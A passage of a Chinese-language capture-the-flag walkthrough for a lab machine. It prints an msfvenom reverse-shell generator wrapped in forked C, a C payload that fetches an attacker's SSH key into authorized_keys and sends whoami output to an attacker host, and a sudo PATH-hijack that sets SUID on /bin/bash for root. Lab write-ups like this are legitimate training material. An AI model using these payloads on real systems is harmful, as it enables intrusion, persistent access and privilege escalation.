class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">LHOST=<span class="string">&quot;192.168.56.3&quot;</span></span><br><span class="line">LPORT=<span class="string">&quot;1234&quot;</span></span><br><span class="line">OUT_C=<span class="string">&quot;test.c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 生成原始 shellcode</span></span><br><span class="line">msfvenom -p linux/x64/shell_reverse_tcp \</span><br><span class="line">		LHOST=<span class="string">&quot;<span class="variable">$LHOST</span>&quot;</span> LPORT=<span class="string">&quot;<span class="variable">$LPORT</span>&quot;</span> \</span><br><span class="line">		-f raw 2&gt;/dev/null &gt; /tmp/rev.raw</span><br><span class="line">[[ -s /tmp/rev.raw ]] || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] msfvenom failed&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 用十六进制格式输出</span></span><br><span class="line">SC_HEX=$(xxd -p -c 1 /tmp/rev.raw | sed <span class="string">&#x27;s/^/0x/&#x27;</span> | <span class="built_in">paste</span> -sd<span class="string">&#x27;,&#x27;</span> -)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 写 C 文件：子进程后台执行</span></span><br><span class="line"><span class="built_in">cat</span> &gt; <span class="string">&quot;<span class="variable">$OUT_C</span>&quot;</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">int fork(void);</span></span><br><span class="line"><span class="string">int execve(const char *p,char *const a[],char *const e[]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(void)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	if (fork() == 0) &#123;</span></span><br><span class="line"><span class="string">unsigned char sc[] = &#123;$SC_HEX&#125;;</span></span><br><span class="line"><span class="string">((void(*)())sc)();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">	return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Generated <span class="variable">$OUT_C</span> (forked)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815200531834.png" alt="image-20250815200531834" data-caption="image-20250815200531834" loading="lazy"></p>
+<p>注意要给予a.sh的执行的权限，然后运行a.sh，将a.sh生成的test.c上传到服务器,最后在kali监听</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815200716356.png" alt="image-20250815200716356" data-caption="image-20250815200716356" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815200836871.png" alt="image-20250815200836871" data-caption="image-20250815200836871" loading="lazy"></p>
+<h2 id="法三：夜从东思路-ssh密钥对"><a href="#法三：夜从东思路-ssh密钥对" class="headerlink" title="法三：夜从东思路(ssh密钥对)"></a>法三：夜从东思路(ssh密钥对)</h2><p>为了成功绕过 -nostdinc 参数带来的限制，我们不能依赖C语言的库函数，而必须转向更底层的实现方式：通过内联汇编直接执行系统调用（syscall）。</p>
+<h3 id="攻击思路如下："><a href="#攻击思路如下：" class="headerlink" title="攻击思路如下："></a>攻击思路如下：</h3><p>构造一个特殊的C语言Payload，其核心是利用内联汇编直接调用 execve 系统调用来执行任意命令。该命令将指示目标服务器从我们的攻击机上下载预先准备好的SSH公钥，并将其写入目标用户 echo 的~&#x2F;.ssh&#x2F;authorized_keys 文件中，从而为我们建立一个持久化的SSH免密登录通道。（这里需要注意，Sublarge设置了timeout 3s，所以尽量写authorized_keys，或者使用上面两种思路）</p>
+<h3 id="Payload-exploit-c"><a href="#Payload-exploit-c" class="headerlink" title="Payload ( exploit.c ):"></a>Payload ( exploit.c ):</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">long syscall(long num, long p1, long p2, long p3);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	char *sh = &quot;/bin/bash&quot;;</span><br><span class="line">	char *arg1 = &quot;bash&quot;;</span><br><span class="line">	char *arg2 = &quot;-c&quot;;</span><br><span class="line">	char *cmd = &quot;mkdir -p ~/.ssh &amp;&amp; busybox wget http://192.168.56.3/authorized_keys.pub -O ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys &amp;&amp; busybox wget http://192.168.56.3:80?$(whoami)&quot;;</span><br><span class="line">	</span><br><span class="line">    const long SYS_EXECVE = 59;</span><br><span class="line"></span><br><span class="line">    char *argv[] = &#123;arg1, arg2, cmd, 0&#125;;</span><br><span class="line"></span><br><span class="line">    syscall(SYS_EXECVE, (long)sh, (long)argv, 0);</span><br><span class="line"></span><br><span class="line">	while(1) &#123;</span><br><span class="line">		syscall(37, 0, 0, 0);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long syscall(long num, long p1, long p2, long p3) &#123;</span><br><span class="line">	long ret;</span><br><span class="line">	__asm__ volatile (</span><br><span class="line">		&quot;movq %1, %%rax\n&quot;</span><br><span class="line">		&quot;movq %2, %%rdi\n&quot;</span><br><span class="line">		&quot;movq %3, %%rsi\n&quot;</span><br><span class="line">		&quot;movq %4, %%rdx\n&quot;</span><br><span class="line">		&quot;syscall\n&quot;</span><br><span class="line">		&quot;movq %%rax, %0\n&quot;</span><br><span class="line">		: &quot;=m&quot;(ret)</span><br><span class="line">		: &quot;m&quot;(num), &quot;m&quot;(p1), &quot;m&quot;(p2), &quot;m&quot;(p3)</span><br><span class="line">		: &quot;rax&quot;, &quot;rdi&quot;, &quot;rsi&quot;, &quot;rdx&quot;</span><br><span class="line">	);</span><br><span class="line">	return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="执行步骤："><a href="#执行步骤：" class="headerlink" title="执行步骤："></a>执行步骤：</h3><p>1.在攻击机（ 192.168.205.128 ）上生成SSH密钥对，将本地公钥内容authorized_keys.pub上传到靶机 authorized_keys 文件，并于秘钥文件所在目录启动一个临时的HTTP服务。<strong>靶机端要求</strong>：<code>~/.ssh</code> 目录权限必须为 <code>700</code>。<code>authorized_keys</code> 文件权限必须为 <code>600</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f ~/.ssh/authorized_keys  //生成秘钥对,可以设置密码也可以直接回车不设置密码</span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816165658870.png" alt="image-20250816165658870" data-caption="image-20250816165658870" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816171001962.png" alt="image-20250816171001962" data-caption="image-20250816171001962" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816171026260.png" alt="image-20250816171026260" data-caption="image-20250816171026260" loading="lazy"></p>
+<p>2.将上述 exploit.c 的代码粘贴到目标Web应用的输入框中，并提交执行。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815210014204.png" alt="image-20250815210014204" data-caption="image-20250815210014204" loading="lazy"></p>
+<p>3.观察攻击机上HTTP服务的日志，确认文件下载和命令执行情况。</p>
+<p>日志清晰地显示，目标主机首先成功请求了 authorized_keys.pub 文件。随后，第三个请求的路径中包含了 echo 字符串，这是 whoami 命令执行结果的回显，从而确认了Web服务的运行用户为echo 。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816171126575.png" alt="image-20250816171126575" data-caption="image-20250816171126575" loading="lazy"></p>
+<h2 id="3-获取初始访问权限"><a href="#3-获取初始访问权限" class="headerlink" title="3.获取初始访问权限"></a>3.获取初始访问权限</h2><p>既然SSH公钥已成功部署到目标主机 echo 用户的家中，现在我们可以使用对应的私钥直接进行SSH登录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="built_in">echo</span>@192.168.205.145</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816170856184.png" alt="image-20250816170856184" data-caption="image-20250816170856184" loading="lazy"></p>
+<p>成功登录后，通过 id 命令验证当前用户身份。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816171309731.png" alt="image-20250816171309731" data-caption="image-20250816171309731" loading="lazy"></p>
+<p>至此，我们已成功获取了用户 echo 的交互式Shell，完成了初始访问。</p>
+<h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1-Sudo权限枚举"><a href="#1-Sudo权限枚举" class="headerlink" title="1.Sudo权限枚举"></a>1.Sudo权限枚举</h2><p>在获得初始立足点后，首要任务是探查是否存在权限提升的路径。我们检查当前用户 echo 的 sudo 配置。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816172125698.png" alt="image-20250816172125698" data-caption="image-20250816172125698" loading="lazy"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l    的输出揭示了关键信息：</span><br></pre></td></tr></table></figure>
+
+<p>1.!env_reset ：这是一个非常重要的安全配置。它告知我们，当 echo 用户使用 sudo 执行命令时，系统<strong>不会</strong>重置大部分用户的环境变量，其中就包括 PATH 环境变量。这个特性是本次提权漏洞的核心。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816172411442.png" alt="image-20250816172411442" data-caption="image-20250816172411442" loading="lazy"></p>
+<p>2.(root) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;system-info.sh：用户 echo 可以无需密码，以 root 权限执行 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;system-info.sh 这个脚本。</p>
+<h2 id="2-PATH环境变量劫持"><a href="#2-PATH环境变量劫持" class="headerlink" title="2.PATH环境变量劫持"></a>2.PATH环境变量劫持</h2><p>接下来，我们审计该脚本的源代码，以分析是否存在可利用的缺陷。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816172511780.png" alt="image-20250816172511780" data-caption="image-20250816172511780" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">#===================================</span><br><span class="line"># Daily System Info Report</span><br><span class="line">#===================================</span><br><span class="line">echo &quot;Starting daily system information collection at $(date)&quot;</span><br><span class="line">echo &quot;------------------------------------------------------&quot;</span><br><span class="line">echo &quot;Checking disk usage...&quot;</span><br><span class="line">df -h</span><br><span class="line">echo &quot;Checking log directory...&quot;</span><br><span class="line">ls -lh /var/log/</span><br><span class="line">find /var/log/ -type f -name &quot;*.gz&quot; -mtime +30 -exec rm &#123;&#125; \;</span><br><span class="line">echo &quot;Checking critical services...&quot;</span><br><span class="line">systemctl is-active sshd</span><br><span class="line">systemctl is-active cron</span><br><span class="line">echo &quot;Collecting CPU and memory information...&quot;</span><br><span class="line">cat /proc/cpuinfo</span><br><span class="line">free -m</span><br><span class="line">echo &quot;------------------------------------------------------&quot;</span><br><span class="line">echo &quot;Report complete at $(date)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计发现，脚本中调用的 df , ls , find , systemctl , cat , free 等一系列命令均未使用其绝对路径（如 &#x2F;bin&#x2F;df ），而是直接使用相对路径。结合前述的 !env_reset 配置，一个经典的<strong>PATH****环境变量劫持</strong>攻击路径就此形成。当脚本以 root 权限运行时，它会依据 echo 用户自定义的 PATH 环境变量来查找这些命令。</p>
+<h2 id="3-提权至Root"><a href="#3-提权至Root" class="headerlink" title="3.提权至Root"></a>3.提权至Root</h2><h3 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a>攻击步骤：</h3><p>1.首先，在 echo 用户的家目录下创建一个名为 df 的恶意脚本。我们的目标是利用 root 权限为&#x2F;bin&#x2F;bash 程序赋予SUID权限位，从而创建一个 “root shell后门”。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; <span class="built_in">df</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; <span class="built_in">df</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">df</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816173025975.png" alt="image-20250816173025975" data-caption="image-20250816173025975" loading="lazy"></p>
+<p>2.接着，修改 PATH 环境变量，将当前目录（ . ）添加到其最前端。这样一来，当系统查找 df 命令时，会优先在我们创建的恶意脚本所在目录中找到并执行它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>3.万事俱备，以 root 权限执行目标脚本，触发我们的Payload。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -u root /usr/local/bin/system-info.sh</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816173353254.png" alt="image-20250816173353254" data-caption="image-20250816173353254" loading="lazy"></p>
+<p>脚本在执行到 df -h 时，会调用我们伪造的 df 程序，从而以 root 权限执行了 chmod +s &#x2F;bin&#x2F;bash 。</p>
+<p>4.验证 &#x2F;bin&#x2F;bash 的权限，确认SUID位是否已成功设置。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816173454620.png" alt="image-20250816173454620" data-caption="image-20250816173454620" loading="lazy"></p>
+<p>权限位中的 s 明确表示SUID位设置成功。</p>
+<p>5.最后，利用这个带有SUID权限的 bash 来获取 root Shell。 -p 参数用于确保 bash 在启动时不会因为安全原因放弃由SUID获得的有效用户ID（EUID）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816173759042.png" alt="image-20250816173759042" data-caption="image-20250816173759042" loading="lazy"></p>
+<p>euid&#x3D;0(root) 的输出确认我们已成功提权至 root 用户。</p>
+<h2 id="4-获取Flag"><a href="#4-获取Flag" class="headerlink" title="4.获取Flag"></a>4.获取Flag</h2><p>成功获得最高权限后，读取并提交所有的flag文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/root.txt /home/echo/user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250816173939648.png" alt="image-20250816173939648" data-caption="image-20250816173939648" loading="lazy"></p>
+<p>渗透测试至此顺利完成</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" rel="tag">fork解决断连</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" rel="tag">ssh秘钥生成连接</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%8F%90%E6%9D%83-env-reset/" rel="tag">提权!env_reset</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925209"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞发现与初始访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Web%E6%9C%8D%E5%8A%A1%E4%BE%A6%E5%AF%9F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">1.Web服务侦察与漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E7%BC%96%E8%AF%91%E9%99%90%E5%88%B6%E8%8E%B7%E5%8F%96Shell"><span class="toc-number">2.2.</span> <span class="toc-text">2.绕过编译限制获取Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A-fork%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E"><span class="toc-number">2.3.</span> <span class="toc-text">法一：(fork脚本解决断连)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9ASublarge%E6%80%9D%E8%B7%AF-fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E"><span class="toc-number">2.4.</span> <span class="toc-text">法二：Sublarge思路(fork解决断连)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sublarge-Payload-a-sh"><span class="toc-number">2.4.1.</span> <span class="toc-text">Sublarge Payload (a.sh ):</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A%E5%A4%9C%E4%BB%8E%E4%B8%9C%E6%80%9D%E8%B7%AF-ssh%E5%AF%86%E9%92%A5%E5%AF%B9"><span class="toc-number">2.5.</span> <span class="toc-text">法三：夜从东思路(ssh密钥对)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">2.5.1.</span> <span class="toc-text">攻击思路如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-exploit-c"><span class="toc-number">2.5.2.</span> <span class="toc-text">Payload ( exploit.c ):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">2.5.3.</span> <span class="toc-text">执行步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">2.6.</span> <span class="toc-text">3.获取初始访问权限</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">三、权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Sudo%E6%9D%83%E9%99%90%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1.Sudo权限枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">3.2.</span> <span class="toc-text">2.PATH环境变量劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83%E8%87%B3Root"><span class="toc-number">3.3.</span> <span class="toc-text">3.提权至Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">3.3.1.</span> <span class="toc-text">攻击步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96Flag"><span class="toc-number">3.4.</span> <span class="toc-text">4.获取Flag</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
